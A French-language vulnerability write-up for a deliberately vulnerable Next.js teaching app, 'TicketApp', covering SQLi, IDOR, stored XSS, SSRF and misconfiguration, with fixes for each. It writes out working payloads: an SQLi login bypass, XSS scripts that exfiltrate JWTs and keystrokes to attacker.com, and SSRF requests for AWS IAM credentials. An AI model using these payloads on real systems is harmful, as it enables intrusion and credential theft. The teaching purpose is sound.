# Analyse des Vulnérabilités — TicketApp

> Application intentionnellement vulnérable à des fins pédagogiques.
> Ne pas déployer en production.

---

## VLN-01 — SQL Injection (SQLi)

**OWASP:** A03:2021 — Injection  
**CWE:** CWE-89  
**Fichier:** `app/api/auth/login/route.js`  
**Sévérité:** Critique

### Description
La requête de login est construite par concaténation directe des entrées utilisateur dans la chaîne SQL, sans utiliser de requêtes paramétrées.

### Code vulnérable
```js
// app/api/auth/login/route.js — ligne 16
const query = `SELECT * FROM users WHERE email = '${email}' AND password = '${password}'`;
const user = db.prepare(query).get();
```

### Exploitation
**Bypass d'authentification :**
```
email:    ' OR '1'='1' --
password: (n'importe quoi)
```
La requête devient :
```sql
SELECT * FROM users WHERE email = '' OR '1'='1' -- ' AND password = '...'
```
Retourne le premier utilisateur de la table (l'admin), connexion sans mot de passe.

**Extraction de données (UNION) :**
```
email: ' UNION SELECT id,username,email,password,role,created_at FROM users --
```

### Correction
```js
// Utiliser des requêtes paramétrées (prepared statements)
const user = db
  .prepare("SELECT * FROM users WHERE email = ? AND password = ?")
  .get(email, hashedPassword);
```

---

## VLN-02 — IDOR / Broken Access Control

**OWASP:** A01:2021 — Broken Access Control  
**CWE:** CWE-639  
**Fichiers:** `app/api/tickets/[id]/route.js`, `app/api/users/[id]/route.js`  
**Sévérité:** Haute

### Description
Les endpoints tickets acceptent n'importe quel ID sans vérifier que le ticket appartient à l'utilisateur authentifié. Tout utilisateur connecté peut lire, modifier ou supprimer les tickets de n'importe quel autre utilisateur.

### Code vulnérable
```js
// app/api/tickets/[id]/route.js — GET
const ticket = db.prepare("SELECT * FROM tickets WHERE id = ?").get(params.id);
// Aucune vérification que ticket.user_id === user.id
return NextResponse.json({ ticket });
```

### Exploitation
Alice (user_id=2) accède au ticket de Bob (ticket id=2) :
```bash
curl http://localhost:3000/api/tickets/2 \
  -H "Authorization: Bearer <token_alice>"
# Retourne le ticket de Bob ✓

curl -X DELETE http://localhost:3000/api/tickets/2 \
  -H "Authorization: Bearer <token_alice>"
# Supprime le ticket de Bob ✓
```

Lecture du profil d'un autre user (avec mot de passe en clair) :
```bash
curl http://localhost:3000/api/users/1 \
  -H "Authorization: Bearer <token_alice>"
# Retourne { id:1, username:"admin", password:"admin123" } ✓
```

### Correction
```js
// Vérifier la propriété du ticket
if (ticket.user_id !== user.id && user.role !== "admin") {
  return NextResponse.json({ error: "Accès refusé" }, { status: 403 });
}
// Ne jamais retourner le mot de passe dans une réponse
const { password, ...safeUser } = targetUser;
```

---

## VLN-03 — XSS Stocké (Stored Cross-Site Scripting)

**OWASP:** A03:2021 — Injection  
**CWE:** CWE-79  
**Fichier:** `app/tickets/[id]/page.js`  
**Sévérité:** Haute

### Description
Le titre, la description et les commentaires des tickets sont rendus côté client via `dangerouslySetInnerHTML` sans aucune sanitisation. Un attaquant peut injecter du code JavaScript arbitraire qui s'exécutera dans le navigateur de tous les utilisateurs qui consultent le ticket.

### Code vulnérable
```jsx
// app/tickets/[id]/page.js
<h1 dangerouslySetInnerHTML={{ __html: ticket.title }} />
<div dangerouslySetInnerHTML={{ __html: ticket.description }} />
<div dangerouslySetInnerHTML={{ __html: c.content }} />
```

### Exploitation
**Payload simple (alert) :**
```html
<img src=x onerror="alert(document.cookie)">
```

**Payload avancé — vol de token JWT :**
```html
<script>
fetch('/api/users/1', {
  headers: { Authorization: 'Bearer ' + localStorage.getItem('token') }
})
.then(r => r.json())
.then(d => fetch('https://attacker.com/steal?data=' + btoa(JSON.stringify(d))))
</script>
```

**Payload — keylogger :**
```html
<script>
document.addEventListener('keypress', e =>
  fetch('https://attacker.com/keys?k=' + e.key)
)
</script>
```

### Correction
```js
// Installer DOMPurify
npm install dompurify

// Sanitiser avant rendu
import DOMPurify from "dompurify";
<div dangerouslySetInnerHTML={{
  __html: DOMPurify.sanitize(ticket.description)
}} />

// Ou mieux : ne pas utiliser dangerouslySetInnerHTML du tout
<p>{ticket.description}</p>
```

---

## VLN-04 — SSRF (Server-Side Request Forgery)

**OWASP:** A10:2021 — SSRF  
**CWE:** CWE-918  
**Fichier:** `app/api/admin/fetch-url/route.js`  
**Sévérité:** Haute

### Description
L'endpoint `/api/admin/fetch-url` effectue une requête HTTP vers n'importe quelle URL fournie par l'utilisateur, depuis le serveur Next.js, sans validation ni liste blanche. Cela permet à un attaquant de :
- Accéder aux métadonnées des instances cloud (AWS, GCP, Azure)
- Scanner le réseau interne
- Contourner les firewalls

### Code vulnérable
```js
// app/api/admin/fetch-url/route.js
const { url } = await request.json();
// Aucune validation de l'URL
const response = await fetch(url, { ... });
return NextResponse.json({ body: await response.text() });
```

### Exploitation
**Métadonnées AWS EC2 :**
```
POST /api/admin/fetch-url
{ "url": "http://169.254.169.254/latest/meta-data/" }

→ ami-id, hostname, iam/...
```

**Vol de credentials IAM AWS :**
```
{ "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role" }

→ { "AccessKeyId": "ASIA...", "SecretAccessKey": "...", "Token": "..." }
```

**Scan réseau interne :**
```
{ "url": "http://192.168.1.1" }       → page admin routeur
{ "url": "http://10.0.0.1:8080" }     → services internes
{ "url": "http://localhost:5432" }     → PostgreSQL
```

### Correction
```js
import { URL } from "url";

const ALLOWED_HOSTS = ["hooks.slack.com", "api.github.com"];
const PRIVATE_RANGES = [
  /^10\./, /^172\.(1[6-9]|2\d|3[01])\./, /^192\.168\./,
  /^127\./, /^169\.254\./, /^::1$/, /^fc00:/, /^fe80:/
];

function isUrlSafe(rawUrl) {
  try {
    const parsed = new URL(rawUrl);
    if (!["http:", "https:"].includes(parsed.protocol)) return false;
    if (!ALLOWED_HOSTS.includes(parsed.hostname)) return false;
    if (PRIVATE_RANGES.some(r => r.test(parsed.hostname))) return false;
    return true;
  } catch { return false; }
}
```

---

## VLN-05 — Security Misconfiguration

**OWASP:** A05:2021 — Security Misconfiguration  
**CWE:** CWE-16, CWE-798, CWE-256  
**Fichiers multiples**  
**Sévérité:** Moyenne à Haute

### 5a. Secrets dans le code source
**Fichier :** `.env`
```
JWT_SECRET=secret123      # Brute-forceable en < 1 seconde
ADMIN_PASSWORD=admin123   # Mot de passe par défaut
```
**Impact :** Forge de tokens JWT, accès admin.  
**Correction :** Utiliser des secrets de minimum 32 caractères aléatoires. Ne jamais committer `.env`. Utiliser un gestionnaire de secrets (Vault, AWS Secrets Manager).

### 5b. Stack traces exposées
**Fichier :** `app/api/auth/login/route.js`
```js
return NextResponse.json({ error: err.message, stack: err.stack }, { status: 500 });
```
**Impact :** Révèle le framework, les chemins de fichiers, la structure interne.  
**Correction :** Logger en interne, retourner un message générique au client.

### 5c. Mots de passe en clair
**Fichier :** `lib/db.js`, `app/api/admin/users/route.js`  
Les mots de passe sont stockés en clair en base et retournés dans les réponses API.  
**Correction :** Utiliser `bcrypt` avec un facteur de coût ≥ 12.

### 5d. Headers de sécurité absents
**Fichier :** `next.config.js`  
Aucun header HTTP de sécurité configuré (CSP, X-Frame-Options, HSTS...).  
**Correction :**
```js
// next.config.js
headers: async () => [{
  source: "/(.*)",
  headers: [
    { key: "X-Frame-Options", value: "DENY" },
    { key: "X-Content-Type-Options", value: "nosniff" },
    { key: "Content-Security-Policy", value: "default-src 'self'" },
    { key: "Strict-Transport-Security", value: "max-age=63072000" },
  ]
}]
```

### 5e. Cookie JWT sans flags de sécurité
**Fichier :** `app/api/auth/login/route.js`
```js
response.cookies.set("token", token, { path: "/" });
// Manque : httpOnly: true, secure: true, sameSite: "strict"
```
**Impact :** Cookie accessible en JavaScript → XSS peut voler la session.

---

## Matrice de risque

| ID | Vulnérabilité | Probabilité | Impact | Risque |
|----|--------------|-------------|--------|--------|
| VLN-01 | SQL Injection | Élevée | Critique | **Critique** |
| VLN-02 | IDOR | Élevée | Haute | **Haute** |
| VLN-03 | XSS Stocké | Élevée | Haute | **Haute** |
| VLN-04 | SSRF | Moyenne | Haute | **Haute** |
| VLN-05a | Secrets exposés | Élevée | Haute | **Haute** |
| VLN-05b | Stack traces | Élevée | Moyenne | **Moyenne** |
| VLN-05c | Mots de passe en clair | Élevée | Haute | **Haute** |
| VLN-05d | Headers absents | Élevée | Moyenne | **Moyenne** |
| VLN-05e | Cookie non sécurisé | Élevée | Haute | **Haute** |
